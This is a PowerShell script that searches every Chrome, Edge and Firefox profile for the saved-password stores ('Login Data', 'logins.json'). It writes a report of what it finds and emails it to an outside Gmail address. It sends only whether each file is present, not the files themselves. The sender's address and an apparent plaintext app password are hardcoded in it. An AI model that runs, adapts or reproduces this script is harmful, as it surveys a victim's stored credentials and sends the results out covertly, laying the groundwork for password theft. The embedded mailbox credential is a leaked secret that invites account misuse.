# -- Check Chrome Login Data in all profiles --
$chromeUserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$chromeReport = @()
if (Test-Path $chromeUserData) {
    $chromeProfiles = Get-ChildItem $chromeUserData -Directory | Where-Object { $_.Name -match 'Default|Profile \d+' }
    foreach ($profile in $chromeProfiles) {
        $loginDataPath = Join-Path $profile.FullName "Login Data"
        if (Test-Path $loginDataPath) {
            $chromeReport += " - $($profile.Name): Login Data found"
        } else {
            $chromeReport += " - $($profile.Name): Login Data NOT found"
        }
    }
} else {
    $chromeReport += "Chrome user data folder NOT found."
}

# -- Check Edge Login Data in all profiles --
$edgeUserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
$edgeReport = @()
if (Test-Path $edgeUserData) {
    $edgeProfiles = Get-ChildItem $edgeUserData -Directory | Where-Object { $_.Name -match 'Default|Profile \d+' }
    foreach ($profile in $edgeProfiles) {
        $loginDataPath = Join-Path $profile.FullName "Login Data"
        if (Test-Path $loginDataPath) {
            $edgeReport += " - $($profile.Name): Login Data found"
        } else {
            $edgeReport += " - $($profile.Name): Login Data NOT found"
        }
    }
} else {
    $edgeReport += "Edge user data folder NOT found."
}

# -- Check Firefox logins.json in all profiles --
$firefoxProfileRoot = "$env:APPDATA\Mozilla\Firefox\Profiles"
$firefoxReport = @()
if (Test-Path $firefoxProfileRoot) {
    $firefoxProfiles = Get-ChildItem $firefoxProfileRoot -Directory
    foreach ($profile in $firefoxProfiles) {
        $loginsPath = Join-Path $profile.FullName "logins.json"
        if (Test-Path $loginsPath) {
            $firefoxReport += " - $($profile.Name): logins.json found"
        } else {
            $firefoxReport += " - $($profile.Name): logins.json NOT found"
        }
    }
} else {
    $firefoxReport += "Firefox profiles folder NOT found."
}

# -- Create report content --
$reportContent = @()
$reportContent += "Browser Saved Login Files Report"
$reportContent += "Generated on: $(Get-Date)"
$reportContent += ""
$reportContent += "Chrome Profiles:"
$reportContent += $chromeReport
$reportContent += ""
$reportContent += "Edge Profiles:"
$reportContent += $edgeReport
$reportContent += ""
$reportContent += "Firefox Profiles:"
$reportContent += $firefoxReport

# -- Save report to TEMP folder --
$reportPath = "$env:TEMP\browser_login_report.txt"
$reportContent | Out-File -FilePath $reportPath -Encoding UTF8

# -- Email setup --
$smtpServer = "smtp.gmail.com"
$smtpPort = 587
$from = "zubaidyomar@gmail.com"
$to = "temdawd2@gmail.com"
$subject = "Browser Login Files Scan Report"
$body = "Please find the attached report of saved browser login files scan."
$username = "zubaidyomar@gmail.com"
$password = "tgcwsfoamkossqej"

# Create credential object
$secpasswd = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($username, $secpasswd)

# Send email with the report attachment
Send-MailMessage -From $from -To $to -Subject $subject -Body $body -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $cred -Attachments $reportPath
